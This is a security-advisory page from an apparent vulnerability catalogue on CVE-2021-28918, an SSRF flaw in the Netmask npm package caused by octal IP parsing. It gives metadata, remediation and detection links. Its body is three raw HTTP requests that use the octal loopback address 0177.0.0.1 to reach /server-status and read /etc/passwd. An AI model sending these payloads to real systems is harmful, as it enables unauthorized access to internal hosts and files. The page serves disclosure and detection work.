---
layout: post
cve_id: CVE-2021-28918
title: Netmask NPM Package - Server-Side Request Forgery
pcap: true
pcap_path: /pcaps/2021/CVE-2021-28918.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-28918.yaml
snort2_rule: N/A
snort3_rule: N/A
author: johnjhacking
severity: critical
impact: 'An attacker can exploit this vulnerability to make requests to internal resources,
  potentially leading to unauthorized access or information disclosure.

  '
remediation: 'Upgrade to Netmask version 2.0.0 or later, which includes a fix for
  this vulnerability.

  '
reference:
- https://github.com/sickcodes/security/blob/master/advisories/SICK-2021-011.md
- https://github.com/advisories/GHSA-pch5-whg9-qr2r
- https://nvd.nist.gov/vuln/detail/CVE-2021-28918
- https://github.com/rs/node-netmask
- https://rootdaemon.com/2021/03/29/vulnerability-in-netmask-npm-package-affects-280000-projects/
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
  cvss-score: 9.1
  cve-id: CVE-2021-28918
  cwe-id: CWE-704
  epss-score: 0.85896
  epss-percentile: 0.99355
  cpe: cpe:2.3:a:netmask_project:netmask:*:*:*:*:*:node.js:*:*
metadata:
  max-request: 3
  vendor: netmask_project
  product: netmask
  framework: node.js
tags:
- cve2021
- cve
- npm
- netmask
- ssrf
- lfi
- netmask_project
- node.js
- vuln
---

## üîç Vulnerability Description
Netmask NPM Package is susceptible to server-side request forgery because of improper input validation of octal strings in netmask npm package. This allows unauthenticated remote attackers to perform indeterminate SSRF, remote file inclusion, and local file inclusion attacks on many of the dependent packages. A remote unauthenticated attacker can bypass packages relying on netmask to filter IPs and reach critical VPN or LAN hosts.

## üåê HTTP Request
```nohighlight
GET /?url=http://0177.0.0.1/server-status HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```nohighlight
GET /?host=http://0177.0.0.1/server-status HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.11 Safari/605.1.15
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```nohighlight
GET /?file=http://0177.0.0.1/etc/passwd HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.6 Safari/605.1.15
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

